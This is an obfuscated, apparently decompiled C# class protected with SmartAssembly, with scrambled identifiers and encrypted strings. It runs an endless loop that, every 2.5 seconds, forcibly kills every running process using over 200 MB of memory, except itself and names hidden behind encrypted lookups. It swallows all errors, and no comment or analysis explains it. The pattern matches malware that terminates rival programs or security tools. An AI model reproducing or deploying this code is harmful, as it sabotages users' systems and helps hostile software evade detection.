using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class NTwFCNJDlXe
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void bVAktnIcbtB()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107377710)) && !process.ProcessName.Contains(getString_0(107377733)) && !process.ProcessName.Contains(getString_0(107377724)) && !process.ProcessName.Contains(getString_0(107377683)) && !process.ProcessName.Contains(getString_0(107377702)) && !process.ProcessName.Contains(getString_0(107377657)) && !process.ProcessName.Contains(getString_0(107377644)) && !process.ProcessName.Contains(getString_0(107377663)) && !process.ProcessName.Contains(getString_0(107377106)) && !process.ProcessName.Contains(getString_0(107377125)) && !process.ProcessName.Contains(getString_0(107377072)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static NTwFCNJDlXe()
	{
		Strings.CreateGetStringDelegate(typeof(NTwFCNJDlXe));
	}
}
